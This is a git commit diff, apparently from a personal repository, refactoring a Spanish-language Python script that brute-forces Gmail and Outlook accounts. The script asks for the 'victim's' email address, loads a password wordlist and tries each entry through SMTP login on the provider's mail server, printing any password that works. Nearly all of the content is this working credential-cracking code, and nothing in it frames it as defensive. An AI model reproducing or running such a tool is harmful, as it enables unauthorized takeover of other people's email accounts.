1f9743f782ed551bd4d9c38d191a8949ee7775c5
Lawliet <jerry_howl_lawliet@hotmail.com>
2017-01-21 01:51:14 -0600

    Mejor Organizado
    Mejor organización en cada sección

--- EMCrk.py
+++ EMCrk.py
@@ -15,16 +15,26 @@ import os.path as path
 import smtplib
 import os
 
+
 os.system('cls')
 
-autor = "By: LawlietJH"
-version = "v_1.0.2"
 
-    #GMCrk - Banner Random
+autor = "By: LawlietJH"
+version = "v_1.0.3"
+
+#sufijo = ""
+#Usuario = ""
+
+#GMCrk - Banner Random
 banner = str(Banner()+"\n\n\t\t [-] Obtener Contraseñas de Outlook o Gmail [-] \n\n")
 print (banner)
  
-Usuario = input("\n\n [+] Dirección de Correo de la Víctima: ")
+def Correo():
+	
+	global sufijo
+	global Usuario
+	
+	Usuario = input("\n\n [+] Dirección de Correo de la Víctima: ")
 
 	# Ejemplos de uso para endswitch: 
 	# X.lower().endswith(('.png', '.jpg', '.jpeg')) 
@@ -34,76 +44,106 @@ Usuario = input("\n\n [+] Dirección de Correo de la Víctima: ")
     # Ejemplo: if '.txt' in X: El problema de esto es que eso lo puede tomar como
     # valido aunque se encontrara como en xt.txtxt esto no deberia ser valido :v
     # pero lo tomaria como valido.
-    
-    
-if Usuario.lower().endswith('@gmail.com'):
-	correo = "gmail"
-elif Usuario.lower().endswith('@hotmail.com'):
-	correo = "outlook"
-else:
-	print("\n\t\t [!] Correo No Valido.")
-	os.system('Timeout /nobreak 02 > Nul')
-	exit(0)
-
-
-	#Se Pide El Diccionario
-NombreA = input("\n [+] Preciona [Enter] o Pon Nombre Del Diccionario: ")
-
-	#Comprobamos Si Existe El Diccionario
-if path.exists(NombreA):
-	Archivo = NombreA
-elif NombreA == "":
-	Archivo = "pwd.zion"
-	print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
-	os.system('Timeout /nobreak 02 > Nul')
 	
-	if not path.exists("pwd.zion"):
-		print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
+	if Usuario.lower().endswith('@gmail.com'):
+		sufijo = "gmail"
+	elif Usuario.lower().endswith('@hotmail.com'):
+		sufijo = "outlook"
+	else:
+		print("\n\t\t [!] Correo No Valido.")
 		os.system('Timeout /nobreak 02 > Nul')
 		exit(0)
-else:
-	print("\n\t No se encontro el Diccionario: "+NombreA)
-	print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
-	Archivo = "pwd.zion"
-	os.system('Timeout /nobreak 02 > Nul')
 	
-	if not path.exists("pwd.zion"):
-		print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
-		resp=input("\n\t [+] ¿Desea Crear Ahora? [S/N]: ")
+
+def Diccionario():
+	
+	global Archivo
+	
+	#Se Pide El Diccionario
+	NombreA = input("\n [+] Preciona [Enter] o Pon Nombre Del Diccionario: ")
+
+
+	#Comprobamos Si Existe El Diccionario
+	if path.exists(NombreA):
+		Archivo = NombreA
 		
-		if resp == "":
-			resp = "N"
+	elif NombreA == "":
+		Archivo = "pwd.zion"
+		print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
+	
+		if not path.exists("pwd.zion"):
+			print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
+			resp=input("\n\t [+] ¿Desea Crear Ahora? [S/N]: ")
 			
-		if resp == "S" or resp == "Si" or resp == "SI" or resp == "si":
-			print("\n\t Se creará el archivo pwd.zion.")
-			print("\n\t Puedes añadirle palabras desde bloc de notas.")
-			Zion=open("pwd.zion","w")
-			Zion.close
-			os.system('Timeout /nobreak 02 > Nul')
-			exit(0)
-		else:
-			os.system('Timeout /nobreak 02 > Nul')
-			exit(0)
+			if resp == "S" or resp == "Si" or resp == "SI" or resp == "si" or resp == "s":
+				print("\n\t [+] Se creará el archivo pwd.zion.")
+				print("\n\t [+] Puedes añadirle palabras desde bloc de notas.")
+				Zion=open("pwd.zion","w")
+				Zion.close
+				print("\n\n\t [*] Saliendo...")
+				os.system('Timeout /nobreak 02 > Nul')
+				exit(0)
+			else:
+				print("\n\n\t [*] Saliendo...")
+				os.system('Timeout /nobreak 02 > Nul')
+				exit(0)
+				
+	else:
+		print("\n\t No se encontro el Diccionario: "+NombreA)
+		print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
+		Archivo = "pwd.zion"
+		os.system('Timeout /nobreak 02 > Nul')
+	
+		if not path.exists("pwd.zion"):
+			print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
+			resp=input("\n\t [+] ¿Desea Crear Ahora? [S/N]: ")
+		
+			if resp == "S" or resp == "Si" or resp == "SI" or resp == "si" or resp == "s":
+				print("\n\t [+] Se creará el archivo pwd.zion.")
+				print("\n\t [+] Puedes añadirle palabras desde bloc de notas.")
+				Zion=open("pwd.zion","w")
+				Zion.close
+				print("\n\n\t [*] Saliendo...")
+				os.system('Timeout /nobreak 02 > Nul')
+				exit(0)
+			else:
+				print("\n\n\t [*] Saliendo...")
+				os.system('Timeout /nobreak 02 > Nul')
+				exit(0)
 
-
+def Conexion():
+	
+	global Archivo
+	global Usuario
+	
 	#SMTP Puerto 587/TCP (Para Clientes de Correo)
-smtpserver = smtplib.SMTP("smtp."+str(nombre)+".com", 587)
-smtpserver.ehlo()
-smtpserver.starttls()
+	smtpserver = smtplib.SMTP("smtp."+str(sufijo)+".com", 587)
+	smtpserver.ehlo()
+	smtpserver.starttls()
 
 	# Abrimos El Diccionario
-Archivo = open(Archivo, "r")
+	Archivo = open(Archivo, "r")
 
 
-print("\n\n [!] Intentando...\n\n\n")
+	print("\n\n [!] Intentando...\n\n\n")
 
-for Pwd in Archivo:
-	try:
-		smtpserver.login(Usuario, Pwd)
-		print (" ------> [!] Contraseña Encontrada: " + str(Pwd))
-		os.system('Timeout /nobreak 03 > Nul')
-		exit(0)
-	except smtplib.SMTPAuthenticationError:
-		print ("\t [*] Contraseña Incorrecta: " + str(Pwd))
+	for Pwd in Archivo:
+		try:
+			smtpserver.login(Usuario, Pwd)
+			print (" ------> [!] Contraseña Encontrada: " + str(Pwd))
+			os.system('Timeout /nobreak 03 > Nul')
+			exit(0)
+		except smtplib.SMTPAuthenticationError:
+			print ("\t [*] Contraseña Incorrecta: " + str(Pwd))
 	
-os.system('Timeout /nobreak 03 > Nul')
+
+def main():
+	Correo()
+	Diccionario()
+	Conexion()
+	
+	print ("\n\n\n\t\t [*] Vuelve a intentarlo...\n\n")
+	os.system('Timeout /nobreak 03 > Nul')
+
+
+main()
